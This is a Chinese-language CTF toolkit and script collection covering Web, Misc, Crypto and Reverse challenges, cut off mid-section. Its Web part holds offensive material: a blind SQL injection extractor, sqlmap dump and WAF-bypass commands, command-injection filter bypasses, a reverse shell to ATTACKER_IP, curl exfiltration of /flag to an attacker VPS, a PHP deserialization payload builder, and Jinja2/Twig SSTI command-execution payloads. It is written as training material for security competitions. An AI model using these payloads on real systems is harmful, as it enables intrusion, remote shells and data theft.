# CTF 工具集锦与代码脚本

> 按 Web / Misc / Crypto / Reverse / PWN 五大方向整理常用工具和实战脚本，开箱即用。

---

## 目录

- [一、Web 方向](#一web-方向)
- [二、Misc 方向](#二misc-方向)
- [三、Crypto 方向](#三crypto-方向)
- [四、Reverse 方向](#四reverse-方向)
- [五、PWN 方向](#五pwn-方向)
- [六、通用工具与技巧](#六通用工具与技巧)

---

## 一、Web 方向

### 1.1 工具清单

| 工具 | 用途 | 一句话用法 | GitHub 地址 |
|------|------|-----------|-------------|
| Burp Suite | 抓包改包、扫描爆破 | 浏览器设代理 → 拦截请求 | 商业软件 |
| SQLMap | 自动化 SQL 注入 | `sqlmap -u URL --dbs` | https://github.com/sqlmapproject/sqlmap |
| dirsearch | 目录扫描 | `dirsearch -u URL -e php,html` | https://github.com/maurosoria/dirsearch |
| gobuster | 目录/子域名爆破 | `gobuster dir -u URL -w wordlist.txt` | https://github.com/OJ/gobuster |
| AntSword | WebShell 管理 | 连接一句话木马 | https://github.com/AntSwordProject/antSword |
| hydra | 暴力破解 | `hydra -l user -P pass.txt URL http-post-form` | https://github.com/vanhauser-thc/thc-hydra |
| curl | 构造 HTTP 请求 | `curl -X POST -d "key=value" URL` | 系统自带 |
| HackBar | 浏览器快速编码/注入 | F12 → HackBar 面板 | 浏览器插件 |
| Postman | API 测试 | 构造复杂请求 | 商业软件 |

### 1.2 SQL 注入脚本

```python
#!/usr/bin/env python3
"""
SQL 布尔盲注自动化脚本
适用于页面有真/假两种状态的注入点
"""

import requests
import sys

def extract_flag(url, true_indicator, payload_template, start=1, end=50):
    """
    url: 目标 URL
    true_indicator: 真条件页面包含的字符串
    payload_template: 注入 payload，{pos} 替换字符位置，{char} 替换 ASCII 值
    """
    flag = ""
    for pos in range(start, end + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = payload_template.format(pos=pos, char=mid)
            try:
                if "SELECT" in payload_template.upper():
                    r = requests.get(url + payload, timeout=10)
                else:
                    r = requests.get(url.format(payload=payload), timeout=10)
                if true_indicator in r.text:
                    low = mid + 1
                else:
                    high = mid - 1
            except requests.RequestException:
                continue
        if low - 1 <= 32:
            break
        flag += chr(low - 1)
        print(f"[+] 位置 {pos}: {flag}")
    return flag

# 用法示例：修改 payload_template 适配具体题目
if __name__ == "__main__":
    # 示例：?id=1' and ascii(substr((select flag from flag),{pos},1))>{char}--+
    # url = "http://target.com/index.php"
    # extract_flag(url, "success", "' and ascii(substr((select flag from flag),{pos},1))>{char}--+", 1, 50)
    print("请根据题目修改 url、true_indicator、payload_template 后运行")
```

### 1.3 SQLMap 常用命令速查

```bash
# 检测注入点
sqlmap -u "http://target.com/page.php?id=1" --batch

# 爆数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 爆表
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# 爆字段
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename --columns

# 爆数据
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T tablename -C col1,col2 --dump

# POST 注入
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123" --batch

# Cookie 注入
sqlmap -u "http://target.com/page.php" --cookie="id=1" --batch

# 绕过 WAF（tamper 脚本）
sqlmap -u URL --tamper=space2comment,between --batch

# 常用 tamper 脚本
# space2comment    空格→/**/
# between          用 BETWEEN 替代 >
# charencode       URL 编码
# randomcase       随机大小写
```

### 1.4 命令执行绕过速查

```bash
# 空格绕过
cat${IFS}flag.txt          # $IFS
cat$IFS$9flag.txt          # $IFS$9
{cat,flag.txt}             # 大括号扩展
cat<flag.txt               # 重定向
%09cat%09flag.txt          # URL 编码 Tab

# 关键字绕过
c'a't flag.txt             # 单引号
c"a"t flag.txt             # 双引号
c\at flag.txt              # 反斜杠
ca$@t flag.txt             # 特殊变量
/bin/cat flag.txt          # 绝对路径

# 无回显（反弹 Shell）
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# 无回显（DNS 外带）
curl http://your-vps/$(cat /flag | base64)

# 无回显（HTTP 外带）
curl http://your-vps/?flag=$(cat /flag)
```

### 1.5 PHP 反序列化 POP 链构造模板

```python
#!/usr/bin/env python3
"""
PHP 反序列化 payload 生成器
根据题目源码修改类定义和属性值
"""

import urllib.parse

class PopChain:
    """根据题目源码替换类名和属性"""

    def __init__(self):
        # 示例：常见 pop 链结构
        # class A { public $obj; }  → 触发 __destruct
        # class B { public $cmd; }  → 触发 __toString → 命令执行
        pass

    @staticmethod
    def generate(payload_cmd: str) -> str:
        """生成序列化字符串，需要根据题目源码手动构造"""
        # 模板：修改类名、属性名、属性值适配题目
        # 示例结构：A.__destruct → B.__toString → system(cmd)
        serialized = f'O:1:"A":1:{{s:3:"obj";O:1:"B":1:{{s:3:"cmd";s:{len(payload_cmd)}:"{payload_cmd}";}}}}'
        return serialized

    @staticmethod
    def url_encode(serialized: str) -> str:
        """URL 编码，用于 GET 传参"""
        return urllib.parse.quote(serialized)


if __name__ == "__main__":
    cmd = "cat /flag"
    payload = PopChain.generate(cmd)
    print(f"[+] 序列化 payload:\n{payload}")
    print(f"\n[+] URL 编码:\n{PopChain.url_encode(payload)}")
    print(f"\n[+] 提示：根据题目源码修改 generate() 中的类定义和属性")
```

### 1.6 SSTI 检测与利用

```bash
# 检测模板注入（按顺序尝试）
{{7*7}}                    # Jinja2/Twig → 49
${7*7}                     # Freemarker → 49
#{7*7}                     # Thymeleaf
<%= 7*7 %>                 # ERB → 49

# Jinja2 命令执行
{{''.__class__.__mro__[1].__subclasses__()}}
# 找到 os._wrap_close 类（通常索引 132 附近），执行：
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}

# Jinja2 简短 payload
{% set x=joiner|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() %}{{x}}

# Twig 命令执行
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

---

## 二、Misc 方向

### 2.1 工具清单

| 工具 | 用途 | 一句话用法 | GitHub 地址 |
|------|------|-----------|-------------|
| CyberChef | 编解码瑞士军刀 | 在线拖拽操作 | https://github.com/gchq/CyberChef |
| Wireshark | 流量分析 | 过滤协议/关键字 | https://github.com/wireshark/wireshark |
| StegSolve | 图片隐写分析 | 切换通道/LSB | https://github.com/eugenekolo/stegsolve |
| Binwalk | 文件分析/提取 | `binwalk -e file` | https://github.com/ReFirmLabs/binwalk |
| foremost | 文件恢复 | `foremost file` | SourceForge: https://foremost.sourceforge.net/ |
| zsteg | PNG 隐写检测 | `zsteg file.png` | https://github.com/zed-0xff/zsteg |
| 010 Editor | 十六进制编辑 | 修改文件头/尾 | 商业软件 |
| John the Ripper | 密码哈希破解 | `john hash.txt` | https://github.com/openwall/john |
| fcrackzip | ZIP 密码破解 | `fcrackzip -u -D -p dict.txt file.zip` | https://github.com/hyc/fcrackzip |
| exiftool | EXIF 信息查看 | `exiftool file.jpg` | https://github.com/exiftool/exiftool |
| GIMP | 图片处理 | 调整通道/偏移 | https://github.com/GNOME/gimp |
| Audacity | 音频分析 | 频谱图查看 | https://github.com/audacity/audacity |

### 2.2 编码解码脚本

```python
#!/usr/bin/env python3
"""
CTF 常见编码批量解码
自动尝试 Base64/32/16、Hex、URL、ROT13、摩尔斯等
"""

import base64
import urllib.parse
import codecs
import re
import sys

MORSE_TABLE = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
    '...--': '3', '....-': '4', '.....': '5', '-....': '6',
    '--...': '7', '---..': '8', '----.': '9',
}


def try_base64(s):
    try:
        decoded = base64.b64decode(s).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base64] {decoded}"
    except Exception:
        pass
    return None


def try_base32(s):
    # Base32 要求长度是 8 的倍数，自动补 =
    padded = s + '=' * ((8 - len(s) % 8) % 8)
    try:
        decoded = base64.b32decode(padded).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base32] {decoded}"
    except Exception:
        pass
    return None


def try_base16(s):
    try:
        decoded = base64.b16decode(s, casefold=True).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Base16] {decoded}"
    except Exception:
        pass
    return None


def try_hex(s):
    try:
        decoded = bytes.fromhex(s).decode('utf-8', errors='ignore')
        if decoded.isprintable() and len(decoded) > 0:
            return f"[Hex] {decoded}"
    except Exception:
        pass
    return None


def try_url(s):
    if '%' in s:
        try:
            decoded = urllib.parse.unquote(s)
            if decoded != s:
                return f"[URL] {decoded}"
        except Exception:
            pass
    return None


def try_rot13(s):
    decoded = codecs.decode(s, 'rot_13')
    if decoded != s:
        return f"[ROT13] {decoded}"
    return None


def try_morse(s):
    # 摩尔斯电码，分隔符为空格或 / 或 |
    if not re.match(r'^[.\-/|\s]+$', s):
        return None
    sep = '/' if '/' in s else ('|' if '|' in s else ' ')
    letters = s.strip().split(sep)
    result = ""
    for letter in letters:
        letter = letter.strip()
        if letter in MORSE_TABLE:
            result += MORSE_TABLE[letter]
        elif letter == '':
            result += ' '
        else:
            return None
    if result.strip():
        return f"[Morse] {result}"
    return None


def auto_decode(s):
    """自动尝试所有编码"""
    print(f"\n输入: {s[:100]}{'...' if len(s) > 100 else ''}")
    print("-" * 50)
    decoders = [try_base64, try_base32, try_base16, try_hex, try_url, try_rot13, try_morse]
    for decoder in decoders:
        result = decoder(s.strip())
        if result:
            print(result)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        auto_decode(sys.argv[1])
    else:
        print("用法: python3 decode_all.py <编码字符串>")
        # 示例
        print("\n--- 示例 ---")
        auto_decode("ZmxhZ3toZWxsb30=")  # Base64: flag{hello}
        auto_decode("666c61677b68656c6c6f7d")  # Hex: flag{hello}
```

### 2.3 文件类型识别脚本

```python
#!/usr/bin/env python3
"""
文件魔数识别
根据文件头部字节判断文件真实类型
"""

import struct

FILE_SIGNATURES = {
    b'\x89PNG\r\n\x1a\n': 'PNG 图片',
    b'\xff\xd8\xff': 'JPEG 图片',
    b'GIF87a': 'GIF 图片 (87a)',
    b'GIF89a': 'GIF 图片 (89a)',
    b'BM': 'BMP 图片',
    b'PK\x03\x04': 'ZIP 压缩包 / DOCX / APK',
    b'PK\x05\x06': 'ZIP 压缩包 (空)',
    b'\x1f\x8b': 'GZIP 压缩',
    b'Rar!\x1a\x07': 'RAR 压缩包',
    b'7z\xbc\xaf\x27\x1c': '7z 压缩包',
    b'%PDF': 'PDF 文档',
    b'\x25\x45\x4f\x46': 'EPS/PS 文件',
    b'\x7fELF': 'ELF 可执行文件 (Linux)',
    b'MZ': 'PE 可执行文件 (Windows EXE/DLL)',
    b'\xca\xfe\xba\xbe': 'Java Class / Mach-O',
    b'\xfe\xed\xfa\xce': 'Mach-O 32-bit',
    b'\xfe\xed\xfa\xcf': 'Mach-O 64-bit',
    b'\xce\xfa\xed\xfe': 'Mach-O 32-bit (反序)',
    b'\xcf\xfa\xed\xfe': 'Mach-O 64-bit (反序)',
    b'\xd0\xcf\x11\xe0': 'MS Office (DOC/XLS/PPT)',
    b'RIFF': 'RIFF 容器 (AVI/WAV/WebP)',
    b'fLaC': 'FLAC 音频',
    b'ID3': 'MP3 音频 (ID3标签)',
    b'\xff\xfb': 'MP3 音频',
    b'OggS': 'OGG 音频',
    b'SQLite format 3\x00': 'SQLite 数据库',
    b'<?xml': 'XML 文件',
    b'<html': 'HTML 文件',
    b'\x00\x00\x00\x1c': 'MP4 视频 (ftyp)',
    b'\x00\x00\x00\x20': 'MP4 视频 (ftyp)',
}


def identify(filepath):
    """识别文件真实类型"""
    with open(filepath, 'rb') as f:
        header = f.read(32)

    print(f"文件: {filepath}")
    print(f"头部 (Hex): {header[:16].hex()}")

    for sig, ftype in FILE_SIGNATURES.items():
        if header.startswith(sig):
            print(f"识别结果: {ftype}")
            return ftype

    # 检查是否为文本文件
    try:
        header.decode('utf-8')
        print("识别结果: 文本文件 (UTF-8)")
    except UnicodeDecodeError:
        print("识别结果: 未知文件类型")

    return None


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        identify(sys.argv[1])
    else:
        print("用法: python3 file_id.py <文件路径>")
```

### 2.4 ZIP 伪加密修复脚本

```python
#!/usr/bin/env python3
"""
ZIP 伪加密检测与修复
CTF 中 ZIP 伪加密的原理：修改本地/全局文件头的加密标志位，
使解压软件误认为文件加密，实际数据并未加密
"""

import struct
import shutil
import sys
import os


def check_fake_encryption(filepath):
    """检测 ZIP 伪加密并修复"""
    # 备份原文件
    backup = filepath + ".bak"
    shutil.copy2(filepath, backup)
    print(f"[*] 已备份原文件到 {backup}")

    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    fixed = False
    pos = 0

    while pos < len(data) - 4:
        # 本地文件头签名: PK\x03\x04
        if data[pos:pos+4] == b'PK\x03\x04':
            # 通用位标志偏移: 6, 长度: 2
            flag_offset = pos + 6
            flag = struct.unpack_from('<H', data, flag_offset)[0]
            encrypted = bool(flag & 0x01)
            if encrypted:
                print(f"[!] 位置 0x{flag_offset:04x}: 本地文件头加密标志位 = 1 (伪加密?)")
                data[flag_offset] = flag & 0xFE  # 清除加密位
                fixed = True
                print(f"[+] 已修复: 清除本地文件头加密位")

            # 跳过本地文件头
            comp_size = struct.unpack_from('<I', data, pos + 18)[0]
            uncomp_size = struct.unpack_from('<I', data, pos + 22)[0]
            fname_len = struct.unpack_from('<H', data, pos + 26)[0]
            extra_len = struct.unpack_from('<H', data, pos + 28)[0]
            pos += 30 + fname_len + extra_len + comp_size

        # 中央目录文件头签名: PK\x01\x02
        elif data[pos:pos+4] == b'PK\x01\x02':
            flag_offset = pos + 8
            flag = struct.unpack_from('<H', data, flag_offset)[0]
            encrypted = bool(flag & 0x01)
            if encrypted:
                print(f"[!] 位置 0x{flag_offset:04x}: 中央目录加密标志位 = 1 (伪加密?)")
                data[flag_offset] = flag & 0xFE
                fixed = True
                print(f"[+] 已修复: 清除中央目录加密位")

            fname_len = struct.unpack_from('<H', data, pos + 28)[0]
            extra_len = struct.unpack_from('<H', data, pos + 30)[0]
            comment_len = struct.unpack_from('<H', data, pos + 32)[0]
            pos += 46 + fname_len + extra_len + comment_len

        else:
            pos += 1

    if fixed:
        output = filepath.replace('.zip', '_fixed.zip')
        with open(output, 'wb') as f:
            f.write(data)
        print(f"\n[+] 修复完成，输出: {output}")
        print(f"[+] 尝试解压: unzip {output}")
    else:
        print("\n[-] 未检测到伪加密，文件可能是真加密或不是 ZIP 格式")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        check_fake_encryption(sys.argv[1])
    else:
        print("用法: python3 zip_fake_encrypt.py <zip文件路径>")
```

### 2.5 流量分析常用技巧

```bash
# Wireshark 过滤器
http                              # 仅 HTTP 流量
http.request.method == "POST"      # POST 请求
tcp.port == 4444                   # 指定端口
ip.addr == 10.0.0.1               # 指定 IP
http contains "flag"               # HTTP 包含 flag
tcp contains "flag"                # TCP 包含 flag

# TCP 流追踪：右键包 → Follow → TCP Stream

# tshark 命令行提取
tshark -r file.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r file.pcap -Y "http" -T fields -e http.file_data
tshark -r file.pcap -Y "tcp.port==4444" -T fields -e data | tr -d '\n' | xxd -r -p

# 提取 HTTP 传输的文件
tshark -r file.pcap --export-objects http,./output/

# USB 流量提取键鼠数据
tshark -r file.pcap -Y "usb.capdata" -T fields -e usb.capdata
```

### 2.6 图片隐写常用命令

```bash
# 文件信息
file image.png
exiftool image.png
strings image.png | grep -i flag

# Binwalk 分析与提取
binwalk image.png          # 分析
binwalk -e image.png       # 自动提取

# PNG LSB 隐写
zsteg image.png            # 自动检测
zsteg -a image.png         # 全通道检测

# StegSolve (Java GUI)
# 打开图片 → 逐通道查看 → 查 LSB

# 图片拼接/高度修改
# 用 010 Editor 打开，修改 IHDR 中的高度字段
# PNG 高度在文件头第 20-23 字节（大端序）

# 盲水印
python3 bwmforpy3.py decode ori.png watermarked.png output.png
```

---

## 三、Crypto 方向

### 3.1 工具清单

| 工具 | 用途 | 一句话用法 | GitHub 地址 |
|------|------|-----------|-------------|
| CyberChef | 编解码/哈希/加密 | 在线拖拽操作 | https://github.com/gchq/CyberChef |
| RsaCtfTool | RSA 攻击集成 | `python3 RsaCtfTool.py -n N -e E --attack all` | https://github.com/RsaCtfTool/RsaCtfTool |
| yafu | 大数分解 | `yafu "factor(N)"` | https://github.com/bbuhrow/yafu |
| SageMath | 数论/代数计算 | `sage` 交互式 | https://github.com/sagemath/sage |
| hashid | 哈希类型识别 | `hashid HASH` | pip install hashid |
| hashcat | 哈希暴力破解 | `hashcat -m 0 hash.txt wordlist.txt` | https://github.com/hashcat/hashcat |
| John | 密码破解 | `john --wordlist=dict.txt hash.txt` | https://github.com/openwall/john |
| factordb | 在线因数分解 | factordb.com | 在线服务 |
| CaptfEncoder | 编解码工具 | GUI | https://github.com/CaptfEncoder/CaptfEncoder |

### 3.2 古典密码解密脚本

```python
#!/usr/bin/env python3
"""
古典密码批量解密
凯撒 / 维吉尼亚 / 栅栏 / 培根 / ROT13
"""

import string


def caesar_bruteforce(ciphertext):
    """凯撒密码暴力破解（26 种偏移）"""
    print("[凯撒密码]")
    for shift in range(26):
        plain = ""
        for ch in ciphertext:
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                plain += chr((ord(ch) - base - shift) % 26 + base)
            else:
                plain += ch
        print(f"  偏移 {shift:2d}: {plain}")


def vigenere_decrypt(ciphertext, key):
    """维吉尼亚密码解密"""
    plain = ""
    key = key.upper()
    ki = 0
    for ch in ciphertext:
        if ch.isalpha():
            base = ord('A') if ch.isupper() else ord('a')
            shift = ord(key[ki % len(key)]) - ord('A')
            plain += chr((ord(ch.upper()) - ord('A') - shift) % 26 + base)
            ki += 1
        else:
            plain += ch
    return plain


def fence_decrypt(ciphertext, rails):
    """栅栏密码解密"""
    n = len(ciphertext)
    cycle = 2 * rails - 2
    if cycle == 0:
        return ciphertext
    groups = [''] * rails
    idx = 0
    for r in range(rails):
        chunk_size = n // cycle + (1 if r < n % cycle else 0) if cycle > 0 else n
        # 简化：按周期分组
        pass

    # 简洁实现
    pattern = list(range(rails)) + list(range(rails - 2, 0, -1))
    indices = sorted(range(n), key=lambda i: (pattern[i % len(pattern)], i))
    result = [''] * n
    for i, idx in enumerate(indices):
        if i < len(ciphertext):
            result[idx] = ciphertext[i]
    return ''.join(result)


def bacon_decode(ciphertext):
    """培根密码解码"""
    bacon_table = {}
    for i, ch in enumerate(string.ascii_uppercase):
        code = format(i, '05b').replace('0', 'A').replace('1', 'B')
        bacon_table[code] = ch
    # I=J, U=V 在部分版本中合并，这里用 26 字母版
    bacon_table["01001"] = 'I'  # I/J
    bacon_table["10101"] = 'U'  # U/V

    # 提取 AB 序列
    ab_seq = ''.join(ch.upper() for ch in ciphertext if ch.upper() in 'AB')
    result = ""
    for i in range(0, len(ab_seq) - 4, 5):
        code = ab_seq[i:i+5]
        if code in bacon_table:
            result += bacon_table[code]
    return result


def rot13(s):
    """ROT13"""
    import codecs
    return codecs.decode(s, 'rot_13')


if __name__ == "__main__":
    print("=== 凯撒暴力破解示例 ===")
    caesar_bruteforce("gmbh{fdhvdu}")

    print("\n=== 维吉尼亚示例 ===")
    print(vigenere_decrypt("RIJVS", "KEY"))

    print("\n=== ROT13 示例 ===")
    print(rot13("synt{ebgn13}"))

    print("\n=== 培根密码示例 ===")
    print(bacon_decode("AABBBAABAAABABBABABB"))
```

### 3.3 RSA 常见攻击脚本

```python
#!/usr/bin/env python3
"""
RSA 常见攻击集合
- 小公钥指数攻击 (e=3)
- 共模攻击
- Fermat 分解 (p/q 接近)
- Wiener 攻击 (d 很小)
"""

from math import gcd, isqrt


def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    g, x1, y1 = extended_gcd(b % a, a)
    return g, y1 - (b // a) * x1, x1


def modinv(a, m):
    g, x, _ = extended_gcd(a % m, m)
    if g != 1:
        raise Exception('模逆不存在')
    return x % m


# === 1. 小公钥指数攻击 (e=3, 明文m很小) ===
def small_e_attack(c, e, n):
    """当 e 很小且 m^e < n 时，c = m^e，直接开 e 次方"""
    from gmpy2 import iroot  # pip install gmpy2
    m, is_exact = iroot(c, e)
    if is_exact:
        return int(m)
    # m^e 可能在模 n 意义下未溢出
    # 尝试 c + k*n 开方
    for k in range(100):
        m, is_exact = iroot(c + k * n, e)
        if is_exact:
            return int(m)
    return None


# === 2. 共模攻击 ===
def common_module_attack(c1, c2, e1, e2, n):
    """同一明文用相同 n 不同 e 加密，gcd(e1,e2)=1 时可恢复"""
    g, s1, s2 = extended_gcd(e1, e2)
    if g != 1:
        return None
    # m = c1^s1 * c2^s2 mod n
    if s1 < 0:
        c1 = modinv(c1, n)
        s1 = -s1
    if s2 < 0:
        c2 = modinv(c2, n)
        s2 = -s2
    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
    return m


# === 3. Fermat 分解 (p 和 q 接近) ===
def fermat_factor(n):
    """当 p 和 q 接近时，Fermat 分解高效"""
    a = isqrt(n)
    if a * a == n:
        return a, a
    a += 1
    b2 = a * a - n
    while True:
        b = isqrt(b2)
        if b * b == b2:
            p, q = a + b, a - b
            if p * q == n:
                return p, q
        a += 1
        b2 = a * a - n
        if a - isqrt(n) > 1000000:  # 防止无限循环
            return None, None


# === 4. Wiener 攻击 (d 很小，e 很大) ===
def wiener_attack(e, n):
    """当 d < n^0.25 时，连分数展开可恢复 d"""
    def continued_fraction(e, n):
        cf = []
        while n:
            q, r = divmod(e, n)
            cf.append(q)
            e, n = n, r
        return cf

    def convergents(cf):
        convs = []
        h_prev, h_curr = 0, 1
        k_prev, k_curr = 1, 0
        for a in cf:
            h_prev, h_curr = h_curr, a * h_curr + h_prev
            k_prev, k_curr = k_curr, a * k_curr + k_prev
            convs.append((h_curr, k_curr))
        return convs

    cf = continued_fraction(e, n)
    convs = convergents(cf)

    for k, d in convs:
        if k == 0:
            continue
        # phi = (e*d - 1) / k
        phi_times = e * d - 1
        if phi_times % k != 0:
            continue
        phi = phi_times // k
        # n = p*q, phi = (p-1)(q-1) => p+q = n - phi + 1
        s = n - phi + 1
        # p,q 是 x^2 - s*x + n = 0 的根
        discriminant = s * s - 4 * n
        if discriminant < 0:
            continue
        from math import isqrt
        sqrt_disc = isqrt(discriminant)
        if sqrt_disc * sqrt_disc == discriminant:
            p = (s + sqrt_disc) // 2
            q = (s - sqrt_disc) // 2
            if p * q == n:
                return d, p, q
    return None


# === 5. 已知 p,q 求明文 ===
def rsa_decrypt(c, p, q, e=65537):
    n = p * q
    phi = (p - 1) * (q - 1)
    d = modinv(e, phi)
    m = pow(c, d, n)
    return m


def int_to_bytes(n):
    """大整数转字节串"""
    length = (n.bit_length() + 7) // 8
    return n.to_bytes(length, 'big')


if __name__ == "__main__":
    print("RSA 攻击脚本集合，根据题目情况选择对应函数调用")
    print("函数列表:")
    print("  small_e_attack(c, e, n)          - 小公钥指数攻击")
    print("  common_module_attack(c1,c2,e1,e2,n) - 共模攻击")
    print("  fermat_factor(n)                  - Fermat 分解")
    print("  wiener_attack(e, n)               - Wiener 攻击")
    print("  rsa_decrypt(c, p, q, e)           - 已知 p,q 解密")
```

### 3.4 哈希类型识别与破解

```bash
# 识别哈希类型
hashid HASH_VALUE

# hashcat 常用模式
# -m 0     MD5
# -m 100   SHA1
# -m 1400  SHA256
# -m 1700  SHA512
# -m 900   MD4
# -m 1000  NTLM
# -m 3200  bcrypt
# -m 5600  NetNTLMv2

hashcat -m 0 hash.txt rockyou.txt              # MD5 字典破解
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a        # 暴力破解
hashcat -m 0 -a 0 hash.txt dict.txt --rule=best64  # 规则变换

# John the Ripper
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
john --format=raw-sha256 hash.txt --wordlist=rockyou.txt
```

---

## 四、Reverse 方向

### 4.1 工具清单

| 工具 | 用途 | 一句话用法 | GitHub 地址 |
|------|------|-----------|-------------|
| IDA Pro | 静态反汇编/反编译 | 拖入二进制 → F5 伪代码 | 商业软件 |
| Ghidra | 开源逆向框架 | 导入 → 自动分析 → Decompile | https://github.com/NationalSecurityAgency/ghidra |
| x64dbg | Windows 动态调试 | 下断点 → 单步 → 看寄存器 | https://github.com/x64dbg/x64dbg |
| GDB + pwndbg | Linux 动态调试 | `gdb ./binary` → `b main` → `r` | https://github.com/pwndbg/pwndbg |
| angr | 符号执行 | 自动求解路径约束 | https://github.com/angr/angr |
| z3 | 约束求解器 | 建模逻辑约束 → 求解 | https://github.com/Z3Prover/z3 |
| ltrace | 库函数追踪 | `ltrace ./binary` | 系统自带 |
| strace | 系统调用追踪 | `strace ./binary` | 系统自带 |
| strings | 提取字符串 | `strings binary` | 系统自带 |
| file | 文件类型 | `file binary` | 系统自带 |
| readelf | ELF 信息 | `readelf -a binary` | 系统自带 |
| objdump | 反汇编 | `objdump -d binary` | 系统自带 |
| patchelf | 修改 ELF | 修改解释器/rpath | https://github.com/NixOS/patchelf |
| apktool | APK 逆向 | `apktool d app.apk` | https://github.com/iBotPeaches/Apktool |
| jadx | Android 反编译 | `jadx-gui app.apk` | https://github.com/skylot/jadx |
| dex2jar | dex 转 jar | `d2j-dex2jar.sh classes.dex` | https://github.com/pxb1988/dex2jar |

### 4.2 z3 约束求解模板

```python
#!/usr/bin/env python3
"""
z3 约束求解模板
常用于逆向中还原算法、求解约束条件
pip install z3-solver
"""

from z3 import *


def z3_example():
    """示例：求解简单约束"""
    x = BitVec('x', 32)
    y = BitVec('y', 32)

    s = Solver()
    s.add(x + y == 0x1234)
    s.add(x * y == 0x5678)
    s.add(x > 0)
    s.add(y > 0)

    if s.check() == sat:
        m = s.model()
        print(f"x = {m[x]}, y = {m[y]}")


def z3_reverse_example():
    """示例：逆向算法还原
    假设逆向出的关键比较逻辑：
    if ((input * 0xDEAD + 0xBEEF) ^ input) == 0x12345678)
    """
    inp = BitVec('inp', 64)

    s = Solver()
    s.add(((inp * 0xDEAD + 0xBEEF) ^ inp) == 0x12345678)

    if s.check() == sat:
        m = s.model()
        print(f"input = {m[inp]}")
        print(f"input (hex) = {hex(m[inp].as_long())}")


def z3_flag_checker():
    """示例：逐字符 flag 检查还原
    常见于 CTF 逆向题：逐字符验证 flag
    """
    flag_len = 20
    flag = [BitVec(f'f{i}', 8) for i in range(flag_len)]

    s = Solver()

    # 每个字符是可打印 ASCII
    for c in flag:
        s.add(c >= 0x20, c <= 0x7e)

    # 假设还原出的约束（示例）
    # flag[0] == 'f', flag[1] == 'l', flag[2] == 'a', flag[3] == 'g'
    s.add(flag[0] == ord('f'))
    s.add(flag[1] == ord('l'))
    s.add(flag[2] == ord('a'))
    s.add(flag[3] == ord('g'))
    # 后续约束根据逆向结果添加
    # s.add(flag[4] + flag[5] == 0xAB)
    # s.add(flag[4] * flag[5] == 0xCD)
    # ...

    if s.check() == sat:
        m = s.model()
        result = ''.join(chr(m[c].as_long()) for c in flag)
        print(f"flag = {result}")


if __name__ == "__main__":
    print("=== z3 简单约束 ===")
    z3_example()

    print("\n=== z3 逆向还原 ===")
    z3_reverse_example()
```

### 4.3 angr 符号执行模板

```python
#!/usr/bin/env python3
"""
angr 符号执行模板
自动寻找从入口到目标地址的路径
pip install angr
"""

import angr


def angr_solve(binary_path, find_addr, avoid_addrs=None):
    """
    binary_path: 二进制文件路径
    find_addr: 目标地址（如打印 flag 的地址）
    avoid_addrs: 要避开的地址列表（如失败分支）
    """
    proj = angr.Project(binary_path, auto_load_libs=False)
    state = proj.factory.entry_state()

    sm = proj.factory.simulation_manager(state)

    avoid = avoid_addrs or []
    sm.explore(find=find_addr, avoid=avoid)

    if sm.found:
        found_state = sm.found[0]
        # 输出标准输出
        print(f"[+] 找到路径!")
        print(f"[+] stdout: {found_state.posix.dumps(1).decode('utf-8', errors='ignore')}")

        # 如果需要从内存/寄存器提取 flag
        # flag = found_state.solver.eval(flag_variable, cast_to=bytes)
        return found_state
    else:
        print("[-] 未找到路径")
        return None


# 用法
if __name__ == "__main__":
    # 修改为实际值
    # angr_solve("./binary", find_addr=0x400850, avoid_addrs=[0x400830])
    print("请根据题目修改 binary_path、find_addr、avoid_addrs")
    print("常用方法：用 IDA 找到成功/失败分支地址，填入参数")
```

### 4.4 GDB + pwndbg 常用命令

```bash
# 基本调试
gdb ./binary
b main              # 在 main 下断点
r                   # 运行
ni                  # 不进入函数的单步
si                  # 进入函数的单步
c                   # 继续运行
finish              # 运行到当前函数返回

# 查看信息
info registers      # 查看寄存器
info functions      # 查看函数列表
x/20wx $rsp         # 查看栈内存 (20个4字节十六进制)
x/s 0x400000        # 查看字符串
disas main          # 反汇编 main

# pwndbg 增强
vmmap               # 查看内存映射
checksec            # 查看保护机制
telescope $rsp 20   # 递归查看栈内容
context             # 显示上下文(寄存器/代码/栈)

# 修改
set $rax = 0        # 修改寄存器
set {int}0x7fffffffe000 = 0x1234  # 修改内存

# Patch
# 用 IDA 或 radare2 修改二进制，或用 gdb 的 write 命令
```

### 4.5 checksec 与保护机制

```bash
# 查看保护
checksec binary
# 或
